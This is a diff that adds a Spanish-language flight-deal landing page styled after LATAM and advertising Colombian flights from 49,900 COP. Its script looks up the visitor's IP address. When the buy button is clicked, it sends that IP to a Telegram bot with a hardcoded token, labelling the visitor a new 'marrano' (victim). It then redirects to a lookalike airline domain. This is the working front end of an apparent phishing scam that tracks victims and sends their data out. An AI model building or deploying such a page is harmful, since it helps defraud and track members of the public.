@@ -1,0 +1,211 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Ofertas de Vuelos | Desde $49.900 COP</title>
+
+  <style>
+    /* Reset básico */
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+    
+    html, body {
+      height: 100%;
+      font-family: 'Poppins', sans-serif;
+      color: white;
+      overflow: hidden;
+    }
+    
+    /* Fondo con video */
+    .video-container {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      overflow: hidden;
+      z-index: -1;
+    }
+    
+    video {
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      min-width: 100%;
+      min-height: 100%;
+      width: auto;
+      height: auto;
+      transform: translate(-50%, -50%);
+      object-fit: cover;
+      filter: brightness(70%);
+    }
+    
+    /* Contenido centrado */
+    .content {
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      text-align: center;
+      background: rgba(0, 0, 0, 0.7);
+      padding: 40px;
+      border-radius: 15px;
+      width: 90%;
+      max-width: 550px;
+      box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.3);
+      animation: fadeIn 1.5s ease-in-out;
+    }
+    
+    /* Animación de entrada */
+    @keyframes fadeIn {
+      from {
+        opacity: 0;
+        transform: translate(-50%, -60%);
+      }
+      to {
+        opacity: 1;
+        transform: translate(-50%, -50%);
+      }
+    }
+
+    h1 {
+      font-size: 2.5rem;
+      margin-bottom: 10px;
+      font-weight: bold;
+    }
+
+    p {
+      font-size: 1.2rem;
+      margin-bottom: 20px;
+      opacity: 0.9;
+    }
+
+    /* Botón - color morado (LATAM) */
+    .button {
+      display: inline-block;
+      padding: 15px 35px;
+      font-size: 20px;
+      color: white;
+      background: linear-gradient(45deg, #6A1B9A, #8E24AA); /* Tonos morados LATAM */
+      border: none;
+      border-radius: 50px;
+      text-decoration: none;
+      font-weight: bold;
+      transition: transform 0.3s, box-shadow 0.3s;
+      box-shadow: 0px 4px 10px rgba(138, 45, 162, 0.5); /* Sombra morada */
+    }
+
+    .button:hover {
+      background: linear-gradient(45deg, #4A148C, #7B1FA2); /* Tonos morados más oscuros */
+      transform: translateY(-3px);
+      box-shadow: 0px 6px 15px rgba(138, 45, 162, 0.7);
+    }
+
+    /* Estilos Responsive */
+    @media (max-width: 600px) {
+      .content {
+        width: 95%;
+        padding: 25px;
+      }
+      h1 {
+        font-size: 2rem;
+      }
+      p {
+        font-size: 1rem;
+      }
+      .button {
+        padding: 12px 28px;
+        font-size: 18px;
+      }
+    }
+  </style>
+</head>
+<body>
+
+  <!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=AW-16935226204">
+</script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'AW-16935226204');
+</script>
+
+  <div class="video-container">
+    <video id="videoLocal" autoplay loop playsinline muted>
+      <source src="" type="video/mp4"> <!-- Se llenará dinámicamente con JS -->
+      Tu navegador no soporta videos en HTML5.
+    </video>
+  </div>
+
+  <div class="content">
+    <h1>¡Vuela por Colombia desde <strong>$49.900</strong>!</h1>
+    <p>Reserva hoy mismo y ahorra en tus próximas vacaciones.</p>
+    <a href="https://www.vuelosconaltura.com/" class="button" id="buyButton">Compra tu vuelo aquí</a>
+  </div>
+
+  <script>
+    document.addEventListener("DOMContentLoaded", async () => {
+        const video = document.getElementById("videoLocal");
+
+        // Lista de videos para elegir aleatoriamente
+        const videos = ["ltam.mp4"];
+        const randomVideo = videos[Math.floor(Math.random() * videos.length)];
+
+        // Asignar el video aleatorio
+        video.querySelector("source").src = randomVideo;
+        video.load();
+
+        // Intentar reproducir el video con sonido silenciado (mute)
+        try {
+            await video.play();
+        } catch (error) {
+            console.error("Autoplay bloqueado:", error);
+        }
+
+        // Activar el sonido del video cuando el usuario haga clic
+        document.addEventListener("click", () => {
+            video.muted = false;  // Desactivar el mute
+            video.play().catch((error) => console.error("Error al intentar reproducir el video con sonido:", error));
+        });
+
+        // Obtener la IP del usuario
+        let userIp = "Desconocida";
+        try {
+            const ipResponse = await fetch("https://api64.ipify.org?format=json");
+            const ipData = await ipResponse.json();
+            userIp = ipData.ip;
+        } catch (error) {
+            console.error("Error obteniendo la IP:", error);
+        }
+
+        // Enviar log a Telegram cuando se hace clic en el botón
+        document.getElementById("buyButton").addEventListener("click", (event) => {
+            event.preventDefault(); // Evita la redirección inmediata
+
+            const telegramToken = "7978973213:AAGZ5tkPk98atTrFAYHtoI2Mb-wqIlQPTWM";
+            const chatId = "-4695874904";
+            const message = encodeURIComponent(`⚡NEW MARRANO LLEGANDO 🐷\n🖥 IP: ${userIp}`);
+
+            fetch(`https://api.telegram.org/bot${telegramToken}/sendMessage?chat_id=${chatId}&text=${message}`)
+                .then(response => response.json())
+                .then(data => {
+                    console.log("Mensaje enviado a Telegram:", data);
+                    window.location.href = "https://latamnacionalestravel.com/travel-web-nacionales-co"; // Redirige después de enviar el mensaje
+                })
+                .catch(error => {
+                    console.error("Error al enviar mensaje a Telegram:", error);
+                    window.location.href = "https://latamnacionalestravel.com/travel-web-nacionales-co"; // Redirige aunque falle
+                });
+        });
+    });
+  </script>
+
+</body>
+</html>
